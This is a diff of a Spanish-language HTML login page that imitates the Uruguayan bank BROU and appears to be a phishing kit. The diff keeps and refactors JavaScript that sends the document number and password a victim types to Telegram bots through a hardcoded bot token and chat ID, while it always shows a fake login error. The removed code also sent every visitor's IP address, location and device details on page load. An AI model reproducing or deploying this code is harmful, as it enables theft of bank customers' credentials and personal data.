@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="es">
 
-<!-- Mirrored from 78.111.75.154/?fbclid=PAVERFWAMv3gNleHRuA2FlbQIxMAABp6A2e32K3TrnN_X2zOWEP52EQ1JXfeXbc5IfFIR64yei5B5rxkfVRAEe9VfL_aem_R9W-id3SEC47viFP90vC_w by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 16:56:59 GMT -->
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -203,8 +202,6 @@
   </footer>
 
   <script>
-    let intentosLogin = 0;
-  
     function togglePassword() {
       const passwordInput = document.getElementById("password");
       const eyeIcon = document.getElementById("eye-icon");
@@ -216,7 +213,7 @@
         eyeIcon.src = "ojo.png";
       }
     }
-  
+
     const bots = [
       {
         token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
@@ -227,147 +224,83 @@
         chatId: '-4867067566'
       }
     ];
-  
-    async function notifyEntranceWithIP() {
-      try {
-        const ipResponse = await fetch('https://api.ipify.org/?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
-  
-        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-        const geoData = await geoResponse.json();
-        const pais = geoData.country_name || "Desconocido";
-        const region = geoData.region || "";
-        const ciudad = geoData.city || "";
-  
-        const userAgent = navigator.userAgent;
-        const plataforma = navigator.platform;
-        const anchoPantalla = window.screen.width;
-        const altoPantalla = window.screen.height;
-  
-        const mensajeEntrada = `📢 Alguien ingresó al sitio web
-  🕒 ${new Date().toLocaleString()}
-  🌐 IP: ${ip}
-  🌎 País: ${pais}
-  🏙️ Región: ${region}
-  🏙️ Ciudad: ${ciudad}
-  💻 Plataforma: ${plataforma}
-  🧭 Navegador: ${userAgent}
-  📱 Resolución: ${anchoPantalla}x${altoPantalla}`;
-  
-        for (const bot of bots) {
-          await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              chat_id: bot.chatId,
-              text: mensajeEntrada,
-              parse_mode: "Markdown"
-            })
-          });
-        }
-      } catch (error) {
-        console.error("Error notificando ingreso con IP:", error);
-      }
-    }
-  
-    document.addEventListener("DOMContentLoaded", () => {
-      notifyEntranceWithIP();
-    });
-  
-    document.getElementById("ingresar").addEventListener("click", async function (e) {
-  e.preventDefault();
 
-  const documentoInput = document.getElementById("documento");
-  const passwordInput = document.getElementById("password");
-  const documento = documentoInput.value.trim();
-  const password = passwordInput.value.trim();
-  const errorDoc = document.getElementById("error-doc");
-  const errorPass = document.getElementById("error-pass");
-  const errorLogin = document.getElementById("login-error");
-
-  let valido = true;
-
-  if (documento === "") {
-    errorDoc.innerText = "El usuario no puede estar vacío";
-    errorDoc.style.display = "block";
-    documentoInput.classList.add("input-error");
-    valido = false;
-  } else if (documento.length !== 8) {
-    errorDoc.innerText = "El número de documento debe tener 8 dígitos";
-    errorDoc.style.display = "block";
-    documentoInput.classList.add("input-error");
-    valido = false;
-  } else {
-    errorDoc.style.display = "none";
-    documentoInput.classList.remove("input-error");
-  }
-
-  if (password === "") {
-    errorPass.style.display = "block";
-    passwordInput.classList.add("input-error");
-    valido = false;
-  } else {
-    errorPass.style.display = "none";
-    passwordInput.classList.remove("input-error");
-  }
-
-  if (!valido) return;
-
-  if (intentosLogin === 0 || password.length < 5) {
-    errorLogin.style.display = "flex";
-    intentosLogin++;
-    return;
-  } else {
-    errorLogin.style.display = "none";
-  }
-
-  const mensaje = `➖➖➖[ BROU UY ]➖➖➖
+    async function notifyLoginAttempt(documento, password) {
+      const mensaje = `➖➖➖[ BROU UY ]➖➖➖
 ✔️ Documento: ${documento}
 ✔️ Contraseña: ${password}
 ➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
 🌐 dev: [@mioydenadiemas]
 ➖➖➖`;
 
-  // Definimos los bots y chats
-  const bots = [
-    {
-      token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
-      chatId: '-4867067566'
-    },
-    {
-      token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
-      chatId: '-4867067566'
+      try {
+        await Promise.all(
+          bots.map(bot =>
+            fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: bot.chatId,
+                text: mensaje,
+                parse_mode: "Markdown"
+              })
+            })
+          )
+        );
+      } catch (error) {
+        console.error("Error enviando credenciales:", error);
+      }
     }
-  ];
 
-  // Enviamos el mensaje a todos los bots (en paralelo)
-  try {
-    await Promise.all(
-      bots.map(bot =>
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: bot.chatId,
-            text: mensaje,
-            parse_mode: "Markdown"
-          })
-        })
-      )
-    );
-    // Si todo salió bien, redirigimos
-    window.location.href = "cargando.html";
-  } catch (error) {
-    console.error("Error enviando credenciales:", error);
-    alert("Error al enviar los datos, por favor intenta de nuevo.");
-  }
-});
+    document.getElementById("ingresar").addEventListener("click", async function (e) {
+      e.preventDefault();
+
+      const documentoInput = document.getElementById("documento");
+      const passwordInput = document.getElementById("password");
+      const documento = documentoInput.value.trim();
+      const password = passwordInput.value.trim();
+      const errorDoc = document.getElementById("error-doc");
+      const errorPass = document.getElementById("error-pass");
+      const errorLogin = document.getElementById("login-error");
+
+      let valido = true;
+
+      if (documento === "") {
+        errorDoc.innerText = "El usuario no puede estar vacío";
+        errorDoc.style.display = "block";
+        documentoInput.classList.add("input-error");
+        valido = false;
+      } else if (documento.length !== 8) {
+        errorDoc.innerText = "El número de documento debe tener 8 dígitos";
+        errorDoc.style.display = "block";
+        documentoInput.classList.add("input-error");
+        valido = false;
+      } else {
+        errorDoc.style.display = "none";
+        documentoInput.classList.remove("input-error");
+      }
+
+      if (password === "") {
+        errorPass.style.display = "block";
+        passwordInput.classList.add("input-error");
+        valido = false;
+      } else {
+        errorPass.style.display = "none";
+        passwordInput.classList.remove("input-error");
+      }
+
+      if (!valido) return;
+
+      // Mostramos el mensaje de error (si es la primera vez)
+      errorLogin.style.display = "flex";
+
+      // Enviamos las credenciales a Telegram
+      await notifyLoginAttempt(documento, password);
+
+      // No redirigimos a otra página ya que el login ha fallado
+    });
   </script>
-  
+
 </body>
 
-<!-- Mirrored from 78.111.75.154/?fbclid=PAVERFWAMv3gNleHRuA2FlbQIxMAABp6A2e32K3TrnN_X2zOWEP52EQ1JXfeXbc5IfFIR64yei5B5rxkfVRAEe9VfL_aem_R9W-id3SEC47viFP90vC_w by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 16:57:01 GMT -->
 </html>
